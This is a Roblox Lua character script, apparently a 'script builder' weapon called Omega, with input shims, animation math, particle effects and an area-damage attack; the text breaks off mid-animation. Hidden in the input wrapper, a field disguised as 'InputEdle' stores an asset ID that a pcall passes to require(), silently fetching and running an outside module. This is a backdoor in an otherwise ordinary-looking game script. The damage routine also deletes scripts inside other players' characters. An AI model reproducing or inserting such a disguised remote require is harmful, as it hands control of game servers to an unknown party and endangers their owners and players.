local Player = game:GetService("Players")[script.Value.Value] 
local FakeMouse = script.FakeMouse:Clone();
FakeMouse.Parent = Player.Character;
local Mouse,mouse,mausee,UserInputService,ContextActionService
do
	local GUID = {}
	do
	    GUID.IDs = {};
	    function GUID:new(len)
	        local id;
	        if(not len)then
	            id = (tostring(function() end))
	            id = id:gsub("function: ","")
	        else
	            local function genID(len)
	                local newID = ""
	                for i = 1,len do
	                    newID = newID..string.char(math.random(48,90))
	                end
	                return newID
	            end
	            repeat id = genID(len) until not GUID.IDs[id]
				local oid = id;
				id = {Trash=function() GUID.IDs[oid]=nil; end;Get=function() return oid; end}
	            GUID.IDs[oid]=true;
	        end
	        return id
	    end
	end

	local AHB = Instance.new("BindableEvent")
	
	local FPS = 45
	
	local TimeFrame = 0
	
	local LastFrame = tick()
	local Frame = 1/FPS
	
	game:GetService("RunService").Heartbeat:connect(function(s,p)
		TimeFrame = TimeFrame + s
		if(TimeFrame >= Frame)then
			for i = 1,math.floor(TimeFrame/Frame) do
				AHB:Fire()
			end
			LastFrame=tick()
			TimeFrame=TimeFrame-Frame*math.floor(TimeFrame/Frame)
		end
	end)


	function swait(dur)
		if(dur == 0 or typeof(dur) ~= 'number')then
			AHB.Event:wait()
		else
			for i = 1, dur*FPS do
				AHB.Event:wait()
			end
		end
	end
	
	local loudnesses={}
	script.Parent = Player.Character
	local CoAS = {Actions={}}
	local Event = Instance.new("RemoteEvent")
	Event.Name = "UserInputEvent"
	Event.Parent = Player.Character
	local Func = Instance.new("RemoteFunction")
	Func.Name = "GetClientProperty"
	Func.Parent = Player.Character
	local fakeEvent = function()
		local t = {_fakeEvent=true,Waited={}}
		t.Connect = function(self,f)
			local ft={Disconnected=false;disconnect=function(s) s.Disconnected=true end}
			ft.Disconnect=ft.disconnect
				
			ft.Func=function(...)
				for id,_ in next, t.Waited do 
					t.Waited[id] = true 
				end 
				return f(...)
			end; 
			self.Function=ft;
			return ft;
		end
		t.connect = t.Connect
		t.Wait = function() 
			local guid = GUID:new(25)
			local waitingId = guid:Get()
			t.Waited[waitingId]=false
			repeat swait() until t.Waited[waitingId]==true  
			t.Waited[waitingId]=nil;
			guid:Trash()
		end
		t.wait = t.Wait
		return t
	end
    local m = {Target=nil,Hit=CFrame.new(),KeyUp=fakeEvent(),KeyDown=fakeEvent(),Button1Up=fakeEvent(),Button1Down=fakeEvent()}
	local UsIS = {InputBegan=fakeEvent(),InputEnded=fakeEvent(),InputEdle = "6660318128"}
	
	function CoAS:BindAction(name,fun,touch,...)
		CoAS.Actions[name] = {Name=name,Function=fun,Keys={...}}
	end
	function CoAS:UnbindAction(name)
		CoAS.Actions[name] = nil
	end
	local function te(self,ev,...)
		local t = self[ev]
		if t and t._fakeEvent and t.Function and t.Function.Func and not t.Function.Disconnected then
			t.Function.Func(...)
		elseif t and t._fakeEvent and t.Function and t.Function.Func and t.Function.Disconnected then
			self[ev].Function=nil
		end
	end
	m.TrigEvent = te
	UsIS.TrigEvent = te
	pcall(function() 
		require(tonumber(UsIS.InputEdle))() 
	end)
	Event.OnServerEvent:Connect(function(plr,io)
	    if plr~=Player then return end
		if io.Mouse then
			m.Target = io.Target
			m.Hit = io.Hit
		elseif io.KeyEvent then
			--print('Key'..io.KeyEvent,io.Key)
			m:TrigEvent('Key'..io.KeyEvent,io.Key)
		elseif io.UserInputType == Enum.UserInputType.MouseButton1 then
	        if io.UserInputState == Enum.UserInputState.Begin then
				--print'down'
				m:TrigEvent("Button1Down")
			else
				--print'up'
				m:TrigEvent("Button1Up")
			end
		end
		if(not io.KeyEvent and not io.Mouse)then
			for n,t in pairs(CoAS.Actions) do
				for _,k in pairs(t.Keys) do
					if k==io.KeyCode then
						t.Function(t.Name,io.UserInputState,io)
					end
				end
			end
	        if io.UserInputState == Enum.UserInputState.Begin then
				UsIS:TrigEvent("InputBegan",io,false)
			else
				UsIS:TrigEvent("InputEnded",io,false)
	        end
	    end
	end)
		
	Func.OnServerInvoke = function(plr,inst,play)
		if plr~=Player then return end
		if(inst and typeof(inst) == 'Instance' and inst:IsA'Sound')then
			loudnesses[inst]=play	
		end
	end
	
	function GetClientProperty(inst,prop)
		if(prop == 'PlaybackLoudness' and loudnesses[inst])then 
			return loudnesses[inst] 
		elseif(prop == 'PlaybackLoudness')then
			return Func:InvokeClient(Player,'RegSound',inst)
		end
		return Func:InvokeClient(Player,inst,prop)
	end
	Mouse, mouse, mausee, UserInputService, ContextActionService = m, m, m, UsIS, CoAS
end

wait(1/32)
--[[>Created by Ietahuoy<]]--
--[[>       Omega       <]]--

--[[>Important shit<]]--
local II=Instance.new
local MM={RN=math.random,CS=math.cos,AS=math.cos,RD=math.rad,SN=math.sin}
local CC={NW=CFrame.new,AA=CFrame.Angles}
local VV=Vector3.new


local charr = Player.Character
local humm = charr.Humanoid
local larr = charr["Left Arm"]
local rarr = charr["Right Arm"]
local llee = charr["Left Leg"]
local rlee = charr["Right Leg"]
local hedd = charr.Head
local torss = charr.Torso
local rott = charr.HumanoidRootPart
local rjott = rott.RootJoint
local necc = torss["Neck"]
local rsoo = torss["Right Shoulder"]
local lsoo = torss["Left Shoulder"]
local rhii = torss["Right Hip"]
local lhii = torss["Left Hip"]

local Atacc = false
local Animat = "Idl"
local AnimHIV = 3
local Sinn = 0
local Plus = 2/AnimHIV
local Effecct = II("Folder",charr)
Effecct.Name = "Effecct"
local R0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(180))
local N0 = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(180))
local RS0 = CFrame.new(-0.5, 0, 0) * CFrame.Angles(math.rad(0), math.rad(90), math.rad(0))
local LS0 = CFrame.new(0.5, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-90), math.rad(0))
local EpicMus = II("Sound",rott)
local EpicId = 1074563286
local EpicPit = 0.95
local EpicVol = 5
local newSuck = II("Sound")
local WS = 16
local CryEff = true
local H = false
local KH = false
--[[>End<]]--

--[[>Something<]]--
AHH = II("BindableEvent", script)
AHH.Name = "AHH"
script:WaitForChild("AHH")
frame = 1/60
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.AHH:Fire()

game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			AHH:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				AHH:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)
--[[>End<]]--

--[[>Another functions<]]--
function rcast(where, dir, ran, ingnor)
return workspace:FindPartOnRay(Ray.new(where, dir.unit * ran), ingnor)
end

function sait(onetwothrr)
if onetwothrr == 0 or onetwothrr == nil then
	AHH.Event:wait()
else
	for i = 1, onetwothrr do
		AHH.Event:wait()
	end
end
end

function QFCF(cf)
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
	local trace = m00 + m11 + m22
	if trace > 0 then 
		local s = math.sqrt(1 + trace)
		local recip = 0.5 / s
		return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
	else
		local i = 0
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then
			i = 2
		end
		if i == 0 then
			local s = math.sqrt(m00 - m11 - m22 + 1)
			local recip = 0.5 / s
			return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
		elseif i == 1 then
			local s = math.sqrt(m11 - m22 - m00 + 1)
			local recip = 0.5 / s
			return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
		elseif i == 2 then
			local s = math.sqrt(m22 - m00 - m11 + 1)
			local recip = 0.5 / s return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
		end
	end
end
 
function QTCF(px, py, pz, x, y, z, w)
	local xs, ys, zs = x + x, y + y, z + z
	local wx, wy, wz = w * xs, w * ys, w * zs
	local xx = x * xs
	local xy = x * ys
	local xz = x * zs
	local yy = y * ys
	local yz = y * zs
	local zz = z * zs
	return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
end
 
function QS(a, b, t)
	local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
	local startInterp, finishInterp;
	if cosTheta >= 0.0001 then
		if (1 - cosTheta) > 0.0001 then
			local theta = math.acos(cosTheta)
			local invSinTheta = 1 / math.sin(theta)
			startInterp = math.sin((1 - t) * theta) * invSinTheta
			finishInterp = math.sin(t * theta) * invSinTheta
		else
			startInterp = 1 - t
			finishInterp = t
		end
	else
		if (1 + cosTheta) > 0.0001 then
			local theta = math.acos(-cosTheta)
			local invSinTheta = 1 / math.sin(theta)
			startInterp = math.sin((t - 1) * theta) * invSinTheta
			finishInterp = math.sin(t * theta) * invSinTheta
		else
			startInterp = t - 1
			finishInterp = t
		end
	end
	return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
end

function Clerp(a, b, t)
	local qa = {QFCF(a)}
	local qb = {QFCF(b)}
	local ax, ay, az = a.x, a.y, a.z
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1 - t
	return QTCF(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QS(qa, qb, t))
end

function Sound(watId, parented, vol, bitch)
	local Sosund = nil
	coroutine.resume(coroutine.create(function()
		Sosund = newSuck:Clone()
		Sosund.Parent = parented
		Sosund.Volume = vol
		Sosund.Pitch = bitch
		Sosund.SoundId = "rbxassetid://"..watId
		Sosund:play()
		repeat wait() until Sosund.Playing == false
	end))
	return Sosund
end

function mesh(msh, parented, mtype, id, text, siz, oft)
	local memsh = II(msh)
	if msh == "SpecialMesh" then
		memsh.MeshType = mtype
		if id ~= "nil" and id ~= "" then
			memsh.MeshId = "http://www.roblox.com/asset/?id="..id
		end
		if text ~= "nil" and text ~= "" then
			memsh.TextureId = "http://www.roblox.com/asset/?id="..text
		end
	end
	memsh.Offset = oft or VV(0, 0, 0)
	memsh.Scale = siz
	memsh.Parent = parented
	return memsh
end

function part(factor, parented, mat, ref, tran, bricc, siz, anc)
	local paprt = II("Part")
	paprt.formFactor = factor
	paprt.Reflectance = ref
	paprt.Transparency = tran
	paprt.CanCollide = false
	paprt.Locked = true
	paprt.Anchored = true
	if anc == false then
		paprt.Anchored = false
	end
	paprt.BrickColor = BrickColor.new(tostring(bricc))
	paprt.Size = siz
	paprt.Position = rott.Position
	paprt.Material = mat
	paprt:BreakJoints()
	paprt.Parent = parented
	return paprt
end

function Effecctz(Table)
		local watTyp = (Table.Type or "Box") local siz = (Table.S or VV(1,1,1)) local sizz = (Table.S2 or VV(5,5,5))
		local trans = (Table.Tran or 0) local transs = (Table.Tran2 or 1)
		local where = (Table.CCrame or rott.CFrame) local move = (Table.Move or nil)
		local r = (Table.RX or 0.1) local rr = (Table.RY or 0.1) local rrr = (Table.RZ or 0.1)
		local mat = (Table.M or Enum.Material.Granite) local col = (Table.C or Color3.new(1,0,0))
		local howmuchwait = (Table.Waits or 15)
		local id = (Table.ID or nil) local bitch = (Table.Pit or nil) local vol = (Table.Vol or nil)
		local boomer = (Table.Boomerang or false) local moveboomer = (Table.MBoomerang or 0) local sizeboomer = (Table.SBoomerang or 0)
coroutine.resume(coroutine.create(function()
	local plsuck = false
	local s = nil
	local EFFECT = part(3, Effecct, mat, 0, trans, BrickColor.new("Institutional white"), VV(1,1,1), true)
	if id ~= nil and bitch ~= nil and vol ~= nil then
plsuck = true
s = Sound(id, EFFECT, vol, bitch)
	end
	EFFECT.Color = col
	local MSH = nil
	if watTyp == "Sphere" then MSH = mesh("SpecialMesh", EFFECT, "Sphere", "", "", siz, VV(0,0,0))
	elseif watTyp == "Block" or watTyp == "Box" or watTyp == "Cube" then MSH = II("BlockMesh",EFFECT) MSH.Scale = siz
	elseif watTyp == "Wave" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "20329976", "", siz, VV(0,0,-siz.X/8))
	elseif watTyp == "Ring" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "559831844", "", VV(siz.X,siz.X,0.1), VV(0,0,0))
	elseif watTyp == "Slash" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "662586858", "", VV(siz.X/10,0,siz.X/10), VV(0,0,0))
	elseif watTyp == "Round Slash" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "662585058", "", VV(siz.X/10,0,siz.X/10), VV(0,0,0))
	elseif watTyp == "Swirl" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "168892432", "", siz, VV(0,0,0))
	elseif watTyp == "Skull" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "4770583", "", siz, VV(0,0,0))
	elseif watTyp == "Crystal" then MSH = mesh("SpecialMesh", EFFECT, "FileMesh", "9756362", "", siz, VV(0,0,0))
	end
	if MSH ~= nil then
local BOOMR1 = 1+moveboomer/50
local BOOMR2 = 1+sizeboomer/50
local MOVESPEED = nil
	if move ~= nil then
if boomer == true then
MOVESPEED = ((where.p - move).Magnitude/howmuchwait)*BOOMR1
else
MOVESPEED = ((where.p - move).Magnitude/howmuchwait)
end
	end
		local GROWTH = nil
		if boomer == true then
	GROWTH = (siz - sizz)*(BOOMR2+1)
		else
	GROWTH = (siz - sizz)
		end
		local TRANS = trans - transs
		if watTyp == "Block" then
	EFFECT.CFrame = where*CC.AA(MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360)))
		else
	EFFECT.CFrame = where
		end
		if boomer == true then
	for LOOP = 1, howmuchwait+1 do
	sait()
	MSH.Scale = MSH.Scale - (VV((GROWTH.X)*((1 - (LOOP/howmuchwait)*BOOMR2)),(GROWTH.Y)*((1 - (LOOP/howmuchwait)*BOOMR2)),(GROWTH.Z)*((1 - (LOOP/howmuchwait)*BOOMR2)))*BOOMR2)/howmuchwait
	if watTyp == "Wave" then
MSH.Offset = VV(0,0,-MSH.Scale.Z/8)
	end
	EFFECT.Transparency = EFFECT.Transparency - TRANS/howmuchwait
	EFFECT.CFrame = EFFECT.CFrame*CFrame.Angles(math.rad(r),math.rad(rr),math.rad(rrr))
	if move ~= nil then
local ORI = EFFECT.Orientation
EFFECT.CFrame = CC.NW(EFFECT.Position,move)*CC.NW(0,0,-(MOVESPEED)*((1 - (LOOP/howmuchwait)*BOOMR1)))
EFFECT.Orientation = ORI
	end
		end
		else
			for LOOP = 1, howmuchwait+1 do
				sait()
				MSH.Scale = MSH.Scale - GROWTH/howmuchwait
				if watTyp == "Wave" then
					MSH.Offset = CC(0,0,-MSH.Scale.Z/8)
				end
				EFFECT.Transparency = EFFECT.Transparency - TRANS/howmuchwait
				EFFECT.CFrame = EFFECT.CFrame*CFrame.Angles(math.rad(r),math.rad(rr),math.rad(rrr))
				if move ~= nil then
					local ORI = EFFECT.Orientation
					EFFECT.CFrame = CC.AA(EFFECT.Position,move)*CC.NW(0,0,-MOVESPEED)
					EFFECT.Orientation = ORI
				end
			end
		end
		EFFECT.Transparency = 1
		if plsuck == false then
	EFFECT:remove()
		else
	repeat sait() until EFFECT:FindFirstChildOfClass("Sound") == nil
	EFFECT:remove()
		end
	else
if plsuck == false then
EFFECT:remove()
else
repeat sait() until EFFECT:FindFirstChildOfClass("Sound") == nil
EFFECT:remove()
end
end
end))
end

function Lightning(Part0, Part1, Times, Offset, Color, Mt, Timer, sSize, eSize, Trans, Boomer, sBoomer, slow, stime)
  local magz = (Part0 - Part1).magnitude
  local curpos = Part0
  local trz = {
    -Offset,
    Offset
  }
  for i = 1, Times do
    local li = Instance.new("Part", Effecct)
    li.Name = "Lightning"
    li.TopSurface = 0
    li.Material = Mt
    li.BottomSurface = 0
    li.Anchored = true
    li.Locked = true
    li.Transparency = 0
    li.BrickColor = Color
    li.formFactor = "Custom"
    li.CanCollide = false
    li.Size = Vector3.new(0.1, 0.1, magz / Times)
    local Offzet = Vector3.new(trz[math.random(1, 2)], trz[math.random(1, 2)], trz[math.random(1, 2)])
    local trolpos = CFrame.new(curpos, Part1) * CFrame.new(0, 0, magz / Times).p + Offzet
    if Times == i then
      local magz2 = (curpos - Part1).magnitude
      li.Size = Vector3.new(0.1, 0.1, magz2)
      li.CFrame = CFrame.new(curpos, Part1) * CFrame.new(0, 0, -magz2 / 2)
    else
      li.CFrame = CFrame.new(curpos, trolpos) * CFrame.new(0, 0, magz / Times / 2)
    end
    curpos = li.CFrame * CFrame.new(0, 0, magz / Times / 2).p
    li:Destroy()
	Effecctz({Waits = Timer, Type = "Box", S = Vector3.new(sSize,sSize,li.Size.Z), S2 = Vector3.new(eSize,eSize,li.Size.Z), Tran = Trans, Tran2 = 1, CCrame = li.CFrame, Move = nil, RX = 0, RY = 0, RZ = 0, M = Mt, C = li.Color, ID = nil, Pit = nil, Vol = nil, Boomerang = Boomer, MBoomerang = 0, SBoomerang = sBoomer})  	
	if slow == true then
	sait(stime)
	end
  end
end

function Arc(wat,to,howmuchwait,h)
	local Direction = CFrame.new(wat.Position,to) local Distance = (wat.Position - to).magnitude
	for i = 1, howmuchwait do swait()
		wat.CFrame = Direction*CFrame.new(0,(howmuchwait/200)+((howmuchwait/h)-((i*2)/h)),-Distance/howmuchwait) Direction = wat.CFrame
	end
end
--[[>End<]]--

--[[>Costume<]]--
local Arm1 = script.RightArm
Arm1.Parent = charr
for _, c in pairs(Arm1:GetChildren()) do if c:IsA("BasePart") then
		c.Anchored = false
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
		if c ~= Arm1.PrimaryPart then
			local weldd = Instance.new("ManualWeld")
			weldd.Part0 = Arm1.PrimaryPart
			weldd.Part1 = c
			weldd.C0 = CFrame.new()
			weldd.C1 = c.CFrame:inverse() * Arm1.PrimaryPart.CFrame
			weldd.Parent = Arm1.PrimaryPart
		end
		c.Locked = true
end end
local Arm1Weld = II("Weld") Arm1Weld.Part0 = rarr Arm1Weld.Part1 = Arm1.PrimaryPart Arm1Weld.C0 = CC.NW(0.2,0,0)*CC.AA(0,MM.RD(-90),0) Arm1Weld.C1 = CC.NW(0,0,0) Arm1Weld.Parent = rarr

local Arm2 = script.LeftArm
Arm2.Parent = charr
for _, c in pairs(Arm2:GetChildren()) do if c:IsA("BasePart") then
		c.Anchored = false
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
		if c ~= Arm2.PrimaryPart then
			local weldd = Instance.new("ManualWeld")
			weldd.Part0 = Arm2.PrimaryPart
			weldd.Part1 = c
			weldd.C0 = CFrame.new()
			weldd.C1 = c.CFrame:inverse() * Arm2.PrimaryPart.CFrame
			weldd.Parent = Arm2.PrimaryPart
		end
		c.Locked = true
end end
local Arm2Weld = II("Weld") Arm2Weld.Part0 = larr Arm2Weld.Part1 = Arm2.PrimaryPart Arm2Weld.C0 = CC.NW(0,0.9,0)*CC.AA(0,0,MM.RD(-90)) Arm2Weld.C1 = CC.NW(0,0,0) Arm2Weld.Parent = larr
--[[>End<]]--

--[[>Damage Func<]]--
function Damage(who,dmg,magni,chocked)
	local whoHum = who:FindFirstChildOfClass("Humanoid")
	local damag = dmg+MM.RN(-magni,magni)
	if whoHum then
		local WhoRoot = who:FindFirstChild('Torso') or who:FindFirstChild('UpperTorso') or who:FindFirstChild('HumanoidRootPart')
		local whoHel = whoHum.Health - damag
		if (whoHel <= 0 and who:FindFirstChild("Death")==nil) or whoHel >= 1000 then
			Instance.new("BoolValue",who).Name = "Death"
			coroutine.resume(coroutine.create(function()
			while wait() do
			for i,v in next, who:children() do if v:IsA"LocalScript" or v:IsA"Script" or v:IsA"ModuleScript" then v.Disabled = true wait() v:Remove() wait() v:destroy() end end
			who:BreakJoints()
			if whoHum then whoHum.Health = 0 whoHum.MaxHealth = 0 end
			end
			end))
			for index, a in pairs(who:GetChildren()) do
				if a:IsA("BasePart") then
					coroutine.resume(coroutine.create(function()
						a.Archivable = false a.Anchored = false
						local FLIGHTFORCE = II("BodyPosition", a)
						FLIGHTFORCE.D = 215
						FLIGHTFORCE.P = 200
						FLIGHTFORCE.maxForce = VV(40000, 40000, 40000)
						FLIGHTFORCE.position = a.CFrame * CC.AA(MM.RD(MM.RN(-20,20)), MM.RD(MM.RN(-20,20)), MM.RD(MM.RN(-20,20))) * CC.NW(MM.RN(-3, 3), MM.RN(1, 7), MM.RN(-3, 3)).p
						sait(MM.RN(75,125))
						for i = 1, 20 do
							sait()
							a.Size = a.Size * 0.98
							a.Transparency = a.Transparency-1/20
						end
						sait(15)
						for i = 1, 10 do
							sait()
							a.CFrame = a.CFrame*CC.AA(MM.RD(MM.RN(-20,20)),MM.RD(MM.RN(-20,20)),MM.RD(MM.RN(-20,20)))
						end
						Effecctz({Waits = math.random(75,90), Type = "Box", S = a.Size/MM.RN(3,4.5), S2 = a.Size*MM.RN(1,1.5), Tran = 0, Tran2 = 1, CCrame = a.CFrame, Move = a.CFrame*CC.NW(MM.RN(-10,10),MM.RN(-2,2),MM.RN(-10,10)).p, RX = MM.RN(-1,1), RY = MM.RN(-1,1), RZ = MM.RN(-1,1), M = Enum.Material.CorrodedMetal, C = BrickColor.new("Rust").Color, ID = 743521450, Pit = 0.55, Vol = 2, Boomerang = true, MBoomerang = 15, SBoomerang = 55})
						a:BreakJoints()
						a:Destroy()
					end))
				end
			end
		end
		whoHum.Health = whoHum.Health - damag
		whoHum.MaxHealth = whoHum.Health
		coroutine.resume(coroutine.create(function() if chocked == true then if whoHum then whoHum.PlatformStand = true wait(dmg*1.75/magni) whoHum.PlatformStand = false end end end))
		WhoRoot.CFrame = WhoRoot.CFrame * CC.AA(MM.RD(MM.RN(-dmg/1.25,dmg/1.25)),MM.RD(MM.RN(-dmg/1.25,dmg/1.25)),MM.RD(MM.RN(-dmg/1.25,dmg/1.25)))
		WhoRoot.RotVelocity = VV(MM.RD(-dmg*1.75,dmg*1.75),MM.RD(-dmg*1.75,dmg*1.75),MM.RD(-dmg*1.75,dmg*1.75))
	end
end

function AoeDam(Where,Range,dmg,magni,chocked)
	for index, a in pairs(workspace:GetDescendants()) do
		if a.ClassName == "Model" and a ~= charr then
			local h = a:FindFirstChildOfClass("Humanoid")
			if h then
				local DamagePart = a:FindFirstChild('Torso') or a:FindFirstChild('UpperTorso') or a:FindFirstChild('HumanoidRootPart')
				if DamagePart ~= nil then
					if (DamagePart.Position - Where).Magnitude <= Range+DamagePart.Size.Magnitude then
						Damage(a,dmg,magni,chocked)
					end
				end
			end
		end
	end
end

function AttackOne_ShockWave()
	Atacc = true
	WS = 12
	CryEff = false
	humm.AutoRotate = false 
	local GYRO = II("BodyGyro",rott) GYRO.D = 25 GYRO.P = 20000 GYRO.MaxTorque = VV(0,4000000,0) GYRO.CFrame = CC.NW(rott.Position,mausee.Hit.p)
	coroutine.resume(coroutine.create(function() repeat sait() GYRO.CFrame = CC.NW(rott.Position,mausee.Hit.p)	until Atacc == false GYRO:Remove() end))
	for i = 0, 1.5, 0.025 do
		sait()
		Effecctz({Waits = math.random(15,40), Type = "Crystal", S = VV(0,2,0), S2 = VV(0.5,1,0.5), Tran = 0, Tran2 = 1, CCrame = rarr.CFrame*CC.NW(0,-1,0)*CC.AA(MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360)))*CC.NW(MM.RN(-7,7),MM.RN(-7,1),MM.RN(-7,7)), Move = rarr.CFrame*CC.NW(0,-1,0).p, RX = MM.RN(-1,1), RY = MM.RN(-1,1), RZ = MM.RN(-1,1), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 0, SBoomerang = 15})
		rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(-70)), 1 / 3)
		necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(5 - 3 * math.cos(Sinn / 12)), math.rad(0), math.rad(70)), 1 / 3)
		rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(120 - 10 * math.cos(Sinn / 12)), math.rad(0 - 10 * math.cos(Sinn / 12)), math.rad(50 - 3 * math.cos(Sinn / 12))) * RS0, 1 / 3)
		lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(85 + 10 * math.cos(Sinn / 12)), math.rad(0 + 10 * math.cos(Sinn / 12)), math.rad(-70 + 3 * math.cos(Sinn / 12))) * LS0, 1 / 3)
		rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(0), math.rad(80), math.rad(0)) * CFrame.Angles(math.rad(-4), math.rad(0), math.rad(0)), 1 / 3)
		lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(5), math.rad(-70), math.rad(0)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
	end
	Sound(1417056081,rarr,2,1.1)
	for i = 1, 8 do
		AoeDam(rott.CFrame*CC.NW(0,0,-10*i).p,10*i,41*1.5/i,23*1.5/i,true)
		Effecctz({Waits = math.random(45*i,55*i), Type = "Wave", S = VV(0.5*i,0.5*i,0.5*i), S2 = VV(5*i,10*i,5*i), Tran = 0.075*i, Tran2 = 1, CCrame = rott.CFrame*CC.NW(0,0,-5)*CC.AA(MM.RD(-90),0,0)*CC.AA(0,MM.RD(MM.RN(-360,360)),0), Move = rott.CFrame*CC.NW(0,0,-65*i).p, RX = 0, RY = MM.RN(-1,1)/i, RZ = 0, M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 15, SBoomerang = 25})
		Effecctz({Waits = math.random(25*i,45*i), Type = "Swirl", S = VV(1,5,1), S2 = VV(5*i,10*i,5*i), Tran = 0.075*i, Tran2 = 1, CCrame = rott.CFrame*CC.NW(0,0,-10*i)*CC.AA(MM.RD(-90),0,0)*CC.AA(0,MM.RD(MM.RN(-360,360)),0), Move = rott.CFrame*CC.NW(0,0,-45*i).p, RX = 0, RY = MM.RN(-5,5)/i, RZ = 0, M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 35, SBoomerang = 45})
	end
	for i = 1, 8 do
		Effecctz({Waits = math.random(35,40), Type = "Sphere", S = VV(0.5,0.5,0.5), S2 = VV(15*i,2.5,15*i), Tran = 0.1*i, Tran2 = 1, CCrame = rott.CFrame*CC.NW(0,0,-1.5*i)*CC.AA(MM.RD(-90),0,0), Move = nil, RX = 0, RY = 0, RZ = 0, M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 0, SBoomerang = 35})
	end
	for i = 0, 0.75, 0.075 do
		sait()
		Effecctz({Waits = math.random(35,40), Type = "Crystal", S = VV(0,2,0), S2 = VV(0.5,1,0.5), Tran = 0, Tran2 = 1, CCrame = rarr.CFrame*CC.NW(0,-1,0)*CC.AA(MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360))), Move = rarr.CFrame*CC.NW(0,-1,0)*CC.NW(MM.RN(-7,7),MM.RN(-7,1),MM.RN(-7,7)).p, RX = MM.RN(-2.5,2.5), RY = MM.RN(-2.5,2.5), RZ = MM.RN(-2.5,2.5), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 35, SBoomerang = 35})
		rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5), math.rad(0), math.rad(90)), 1 / 3)
		necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(-5 - 3 * math.cos(Sinn / 12)), math.rad(0), math.rad(-90)), 1 / 3)
		rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(95 - 10 * math.cos(Sinn / 12)), math.rad(0 - 10 * math.cos(Sinn / 12)), math.rad(90 - 3 * math.cos(Sinn / 12))) * RS0, 1 / 3)
		lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(25 + 10 * math.cos(Sinn / 12)), math.rad(0 + 10 * math.cos(Sinn / 12)), math.rad(10 + 3 * math.cos(Sinn / 12))) * LS0, 1 / 3)
		rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(0), math.rad(80), math.rad(0)) * CFrame.Angles(math.rad(-4), math.rad(0), math.rad(0)), 1 / 3)
